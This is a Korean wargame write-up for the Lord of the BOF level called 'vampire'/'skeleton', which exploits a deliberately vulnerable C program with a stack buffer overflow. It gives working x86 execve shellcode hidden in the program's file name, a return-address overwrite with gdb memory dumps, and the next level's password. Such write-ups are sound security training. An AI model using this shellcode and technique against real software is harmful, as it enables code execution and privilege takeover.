============================================================================================================
[lob] vampire
============================================================================================================

.. uml::
    
    @startuml

    start

    :Source Analysis;

    :Memory Structure;

    :Segmentation fault;

    :argv[1]의 주소값 변경;

    :RET 주소를 argv[1] 주소로 변경하여 공격 진행;
    
    stop

    @enduml

|

Source Analysis
============================================================================================================


해당 문제 소스코드는 다음과 같습니다.

.. code-block:: c

    /*
    The Lord of the BOF : The Fellowship of the BOF
        - skeleton
        - argv hunter
    */

    #include <stdio.h>
    #include <stdlib.h>

    extern char **environ;

    main(int argc, char *argv[])
    {
        char buffer[40];
        int i, saved_argc;

        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
            memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
            printf("stack is still your friend.\n");
            exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
            printf("argument is too long!\n");
            exit(0);
        }

        // argc saver
        saved_argc = argc;

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // ultra argv hunter!
        for(i=0; i<saved_argc; i++)
            memset(argv[i], 0, strlen(argv[i]));
    }

|

Memory Structure
============================================================================================================

스택 메모리 공간에 다음과 같이 들어가게 됩니다.

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte) <- strcpy
    SFP     (4byte)
    RET     (4byte)
    argc    (4byte)
    argv    (4byte)
    ----------------
    HIGH    
    ================

|

Segmentation fault
============================================================================================================

버퍼오버플로우가 일어나는 지점을 확인합니다.

※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행해야 합니다.

.. code-block:: console

    $ ./skeleton `python -c 'print "a"*47'`
    stack is still your friend.

    $ ./skeleton `python -c 'print "a"*47+"\xbf"'`
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒
    Segmentation fault


|

exploit
============================================================================================================


argv[0]에 쉘코드 삽입
------------------------------------------------------------------------------------------------------------

기존에 사용한 쉘코드에는 \x2f 값이 있기 때문에 정상적으로 쉘코드가 동작하지 않습니다.

\x2f가 없는 쉘코드로 파일명을 생성하도록 합니다.

.. code-block:: console
    
    $ ln skeleton2 `python -c 'print "\x90"*40+"\x31\xc0\x50\xba\x11\x11\x11\x11\x81\xc2\x1e\x1e\x62\x57\x52\xba\x11\x11\x11\x11\x81\xc2\x1e\x51\x58\x5d\x52\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`

    $ gdb -q `python -c 'print "\x90"*40+"\x31\xc0\x50\xba\x11\x11\x11\x11\x81\xc2\x1e\x1e\x62\x57\x52\xba\x11\x11\x11\x11\x81\xc2\x1e\x51\x58\x5d\x52\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`

    (gdb) b* main
    Breakpoint 1 at 0x8048500
    (gdb) r `python -c 'print "a"*47+"\xbf"'`
    Starting program: /home/vampire/▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒P▒▒▒bWR▒▒▒QX]R▒▒PS▒▒1Ұ
                                             ̀ `python -c 'print "a"*47+"\xbf"'`

    /bin/bash: /home/troll/.bashrc: Permission denied

    Breakpoint 1, 0x8048500 in main ()
    (gdb) x/100x $esp

    ==========================================================================
    0xbffffa0c:     0x400309cb      0x00000002      0xbffffa54      0xbffffa60
    0xbffffa1c:     0x40013868      0x00000002      0x08048450      0x00000000
    0xbffffa2c:     0x08048471      0x08048500      0x00000002      0xbffffa54
    0xbffffa3c:     0x08048390      0x080486ac      0x4000ae60      0xbffffa4c
    0xbffffa4c:     0x40013e90      0x00000002      0xbffffb4c      0xbffffbe6
    0xbffffa5c:     0x00000000      0xbffffc17      0xbffffc39      0xbffffc43
    0xbffffa6c:     0xbffffc51      0xbffffc70      0xbffffc80      0xbffffc99
    0xbffffa7c:     0xbffffcb4      0xbffffcbf      0xbffffccd      0xbffffd0e
    (중략)
    0xbfffff5c:     0x35333b31      0x682f003a      0x2f656d6f      0x706d6176
    0xbfffff6c:     0x2f657269      0x90909090      0x90909090      0x90909090
    0xbfffff7c:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbfffff8c:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbfffff9c:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbfffffac:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbfffffbc:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbfffffcc:     0x90909090      0x90909090      0xba50c031      0x11111111
    0xbfffffdc:     0x1e1ec281      0xba525762      0x11111111      0x511ec281
    0xbfffffec:     0x89525d58      0x895350e3      0xb0d231e1      0x0080cd0b
    0xbffffffc:     0x00000000      Cannot access memory at address 0xc0000000
    ==========================================================================

program명 주소를 찾아서 RET로 덮어씌우면 됩니다.


RET 주소를 argv[0] 주소로 변경하여 공격 진행
------------------------------------------------------------------------------------------------------------

filename : nop(100 byte) + shellcode (39 byte) 

argv[1] : nop(44 byte) + argv[0] address

.. code-block:: console

    $ ./`python -c 'print "\x90"*100+"\x31\xc0\x50\xba\x11\x11\x11\x11\x81\xc2\x1e\x1e\x62\x57\x52\xba\x11\x11\x11\x11\x81\xc2\x1e\x51\x58\x5d\x52\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'` `python -c 'print "a"*44+"\xbc\xff\xff\xbf"'`
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒▒▒▒

    bash$ whoami
    skeleton
    bash$ my-pass
    euid = 510
    shellcoder
